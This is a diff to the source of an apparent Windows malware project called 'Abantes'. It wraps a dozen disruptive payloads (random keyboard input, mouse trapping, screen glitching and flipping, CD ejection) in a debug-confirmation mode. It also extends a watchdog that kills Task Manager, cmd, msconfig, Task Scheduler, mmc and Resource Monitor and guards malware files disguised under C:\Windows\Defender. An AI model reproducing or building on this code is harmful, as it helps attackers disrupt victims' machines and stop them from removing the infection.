@@ -262,25 +262,72 @@ namespace Abantes.Payloads
                 switch (_random.Next(13))
                 {
                     case 0:
-                        Thread randomOSsound = new Thread(new ThreadStart(Annoying.RandomOSSounds));
-                        randomOSsound.Start();
+                        if (MainThread.Mode == 1)
+                        {
+                            if (MessageBox.Show("START RANDOM OS SOUNDS PAYLOAD", "DEBUG", MessageBoxButtons.YesNo)==DialogResult.Yes)
+                            {
+                                Thread randomOSsound = new Thread(new ThreadStart(Annoying.RandomOSSounds));
+                                randomOSsound.Start();
+                            }
+                        }
+                        else
+                        {
+                            Thread randomOSsound = new Thread(new ThreadStart(Annoying.RandomOSSounds));
+                            randomOSsound.Start();
+                        }
                         break;
                     case 1:
-                        Thread randomKeyboard = new Thread(new ThreadStart(Annoying.RandomKeyboard));
-                        randomKeyboard.Start();
+                        if (MainThread.Mode == 1)
+                        {
+                            if (MessageBox.Show("START RANDOM KEYBOARD INPUT PAYLOAD", "DEBUG", MessageBoxButtons.YesNo) == DialogResult.Yes)
+                            {
+                                Thread randomKeyboard = new Thread(new ThreadStart(Annoying.RandomKeyboard));
+                                randomKeyboard.Start();
+                            }
+                        }
+                        else
+                        {
+                            Thread randomKeyboard = new Thread(new ThreadStart(Annoying.RandomKeyboard));
+                            randomKeyboard.Start();
+                        }
                         break;
                     case 2:
-                        Annoying.ChangeWindowText();
+                        if (MainThread.Mode == 1)
+                        {
+                            if (MessageBox.Show("START ICON FOLLOWING CURSOR PAYLOAD", "DEBUG", MessageBoxButtons.YesNo) == DialogResult.Yes)
+                            {
+                                Thread cursoricon = new Thread(new ThreadStart(Annoying.CursorIcon));
+                                cursoricon.Start();
+                            }
+                        }
+                        else
+                        {
+                            Thread cursoricon = new Thread(new ThreadStart(Annoying.CursorIcon));
+                            cursoricon.Start();
+                        }
                         break;
                     case 3:
-                        Thread cursoricon = new Thread(new ThreadStart(Annoying.CursorIcon));
-                        cursoricon.Start();
-                        break;
-                    case 4:
-                        if (_random.Next(100) > 50)
+                        if (MainThread.Mode == 1)
+                        {
+                            if (MessageBox.Show("START MOUSE TRAP PAYLOAD", "DEBUG", MessageBoxButtons.YesNo) == DialogResult.Yes)
+                            {
+                                Thread mouseTrap = new Thread(new ThreadStart(Annoying.MouseTrap));
+                                mouseTrap.Start();
+                            }
+                        }
+                        else
                         {
                             Thread mouseTrap = new Thread(new ThreadStart(Annoying.MouseTrap));
                             mouseTrap.Start();
+                        }
+                        break;
+                    case 4:
+                        if (MainThread.Mode == 1)
+                        {
+                            if (MessageBox.Show("START CHANGE WINDOW TITLE TEXT PAYLOAD", "DEBUG", MessageBoxButtons.YesNo) == DialogResult.Yes)
+                            {
+                                Annoying.ChangeWindowText();
+                            }
                         }
                         else
                         {
@@ -288,34 +335,107 @@ namespace Abantes.Payloads
                         }
                         break;
                     case 5:
-                        Annoying.ChangeWindowText();
+                        if (MainThread.Mode == 1)
+                        {
+                            if (MessageBox.Show("START EJECT CD PAYLOAD", "DEBUG", MessageBoxButtons.YesNo) == DialogResult.Yes)
+                            {
+                                Annoying.EjectCd();
+                            }
+                        }
+                        else
+                        {
+                            Annoying.EjectCd();
+                        }
                         break;
                     case 6:
-                        Annoying.EjectCd();
+                        if (MainThread.Mode == 1)
+                        {
+                            if (MessageBox.Show("START SCREEN SCREW PAYLOAD", "DEBUG", MessageBoxButtons.YesNo) == DialogResult.Yes)
+                            {
+                                Thread screenscrew = new Thread(new ThreadStart(Annoying.Screen_Screw));
+                                screenscrew.Start();
+                            }
+                        }
+                        else
+                        {
+                            Thread screenscrew = new Thread(new ThreadStart(Annoying.Screen_Screw));
+                            screenscrew.Start();
+                        }
                         break;
                     case 7:
-                        Thread screenscrew = new Thread(new ThreadStart(Annoying.Screen_Screw));
-                        screenscrew.Start();
+                        if (MainThread.Mode == 1)
+                        {
+                            if (MessageBox.Show("START SCREEN GLITCH PAYLOAD", "DEBUG", MessageBoxButtons.YesNo) == DialogResult.Yes)
+                            {
+                                Thread screenglitch = new Thread(new ThreadStart(Annoying.Screen_Glitching));
+                                screenglitch.Start();
+                            }
+                        }
+                        else
+                        {
+                            Thread screenglitch = new Thread(new ThreadStart(Annoying.Screen_Glitching));
+                            screenglitch.Start();
+                        }
                         break;
                     case 8:
-                        Thread screenglitch = new Thread(new ThreadStart(Annoying.Screen_Glitching));
-                        screenglitch.Start();
+                        if (MainThread.Mode == 1)
+                        {
+                            if (MessageBox.Show("START HELP ICONS ON SCREEN PAYLOAD", "DEBUG", MessageBoxButtons.YesNo) == DialogResult.Yes)
+                            {
+                                Thread helpicons = new Thread(new ThreadStart(Annoying.Display_Icons_Error));
+                                helpicons.Start();
+                            }
+                        }
+                        else
+                        {
+                            Thread helpicons = new Thread(new ThreadStart(Annoying.Display_Icons_Error));
+                            helpicons.Start();
+                        }
                         break;
                     case 9:
-                        Thread helpicons = new Thread(new ThreadStart(Annoying.Display_Icons_Error));
-                        helpicons.Start();
+                        if (MainThread.Mode == 1)
+                        {
+                            if (MessageBox.Show("START CRAZY BOUNCE PAYLOAD", "DEBUG", MessageBoxButtons.YesNo) == DialogResult.Yes)
+                            {
+                                Thread crazybounce = new Thread(new ThreadStart(Annoying.CrazyBounce));
+                                crazybounce.Start();
+                            }
+                        }
+                        else
+                        {
+                            Thread crazybounce = new Thread(new ThreadStart(Annoying.CrazyBounce));
+                            crazybounce.Start();
+                        }
                         break;
                     case 10:
-                        Thread crazybounce = new Thread(new ThreadStart(Annoying.CrazyBounce));
-                        crazybounce.Start();
+                        if (MainThread.Mode == 1)
+                        {
+                            if (MessageBox.Show("START SCREEN FLIPPING PAYLOAD", "DEBUG", MessageBoxButtons.YesNo) == DialogResult.Yes)
+                            {
+                                Thread flip = new Thread(new ThreadStart(Annoying.Flip));
+                                flip.Start();
+                            }
+                        }
+                        else
+                        {
+                            Thread flip = new Thread(new ThreadStart(Annoying.Flip));
+                            flip.Start();
+                        }
                         break;
                     case 11:
-                        Thread flip = new Thread(new ThreadStart(Annoying.Flip));
-                        flip.Start();
-                        break;
-                    case 12:
-                        Thread text = new Thread(new ThreadStart(Annoying.Text));
-                        text.Start();
+                        if (MainThread.Mode == 1)
+                        {
+                            if (MessageBox.Show("START BLACK/RED TEXT ON SCREEN PAYLOAD", "DEBUG", MessageBoxButtons.YesNo) == DialogResult.Yes)
+                            {
+                                Thread text = new Thread(new ThreadStart(Annoying.Text));
+                                text.Start();
+                            }
+                        }
+                        else
+                        {
+                            Thread text = new Thread(new ThreadStart(Annoying.Text));
+                            text.Start();
+                        }
                         break;
                 }
                 Thread.Sleep(10000);
@@ -323,12 +443,14 @@ namespace Abantes.Payloads
         }
         public static void WatchDogThread()
         {
-            string[] NeverRun = { "msconfig", "taskmgr", "cmd" };
+            string[] NeverRun = { "msconfig", "taskmgr", "cmd", "taskschd", "mmc", "resmon" };
             string[] MustRun = { "Rules" };
+            string[] Files = { @"C:\Windows\Defender\Rules.exe", @"C:\Windows\Defender\Abantes.exe" };
             while (true)
             {
                 Thread.Sleep(1000);
                 WatchDog.ProcessWatchDog(NeverRun, MustRun);
+                WatchDog.FileWatchDog(Files);
             }
         }
     }
